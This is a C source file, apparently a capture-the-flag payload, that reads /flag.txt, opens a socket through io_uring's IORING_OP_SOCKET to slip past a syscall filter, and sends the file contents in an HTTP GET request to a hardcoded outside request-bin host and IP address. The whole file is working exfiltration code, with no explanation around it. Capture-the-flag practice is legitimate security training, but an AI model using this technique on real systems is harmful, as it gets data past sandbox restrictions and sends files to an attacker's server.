#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <liburing.h>

char *hostname = "en6fb8xm9qefw.x.pipedream.net"; // change this
char *ip = "44.216.35.201"; // change this
int port = 80;


int main(int argc , char *argv[])
{
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    char buf[0x100];
    char request[0x100];
    memset(buf, 0, 0x100);
    memset(request, 0, 0x100);
    int fd = open("/flag.txt", 0);                      
	
    read(fd , buf, 0x100);
    write(1, buf, 0x100);

    io_uring_queue_init(1, &ring, 0);
    sqe = io_uring_get_sqe(&ring);
    
    sqe->opcode = IORING_OP_SOCKET;
    sqe->fd = AF_INET;
    sqe->off = SOCK_STREAM;
    sqe->len = 0;			
    sqe->rw_flags = 0;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    printf("ret: %d\n", cqe->res);

    int sockfd = cqe->res;
    if (sockfd == -1){
        printf("Fail to create a socket.");
    }

    // socket connection

    // struct sockaddr_in info;
    // bzero(&info,sizeof(info));
    // info.sin_family = PF_INET;

    // // ip & port
    // info.sin_addr.s_addr = inet_addr(ip);
    // info.sin_port = htons(port);

    // int err = connect(sockfd, (struct sockaddr *)&info, sizeof(info));
    // if(err==-1){
    //     printf("Connection error");
    // }

    // char *message = &buf;
    // char receiveMessage[1000] = {};

    // send(sockfd,message, 0x100,0);

    printf("ip: %s\n", ip);
    // Server information
    strtok(buf, "{");
    strcat(request, "GET /");
    strcat(request, buf);
    strcat(request, " HTTP/1.1\r\nHost: ");
    strcat(request, hostname);
    strcat(request, "\r\nConnection: close\r\n\r\n");
    printf("request: \n%s\n", request);

    struct sockaddr_in info, *res;
    int status;

    bzero(&info,sizeof(info));
    info.sin_family = AF_INET;
    info.sin_port = htons(80);  // HTTP port
    info.sin_addr.s_addr = inet_addr(ip);
    
    // Connect to the server
    connect(sockfd, (struct sockaddr*)&info, sizeof(info));
    
    // Send the HTTP request
    send(sockfd, request, strlen(request), 0);
    
    // Close the socket
    close(sockfd);
    return 0;
}
